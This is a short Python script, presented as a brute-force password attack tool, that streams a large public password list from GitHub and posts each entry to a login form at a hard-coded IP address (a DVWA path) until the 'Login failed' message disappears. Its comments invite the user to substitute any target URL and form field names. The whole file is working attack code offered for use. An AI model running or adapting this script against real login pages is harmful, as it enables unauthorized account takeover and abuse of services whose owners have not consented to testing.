#!/usr/bin/env python

# This is a simple brutforce password attack program that does not need any password-list. which can be done from any operating system without spending storage space. Its uses any internet password list.
import requests
import urllib2
import sys

# Put here the url you want to do a bruteforce
target_url = "http://174.36.198.223/dvwa/login.php"

# Put here: the name of the element as the key and the value as the value ---- key - the name of the element and the value what you want to put on this input field. 
# The last is the button element, the key is the "name" of the element and the value is the "type"
data_dict = {"username": "admin", "password": "", "Login": "submit"}

# Here you can put the url of the any password list
dictionary_url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt"

for line in urllib2.urlopen(dictionary_url):
    word = line.strip()
    data_dict["password"] = word
    response = requests.post(target_url, data=data_dict)
    print("\r" + word + "     ")
    sys.stdout.flush()
    if "Login failed" not in response.content:
            print("[+] I have the password --> " + word)
            exit()

print("[-] Reached end of the line :(")

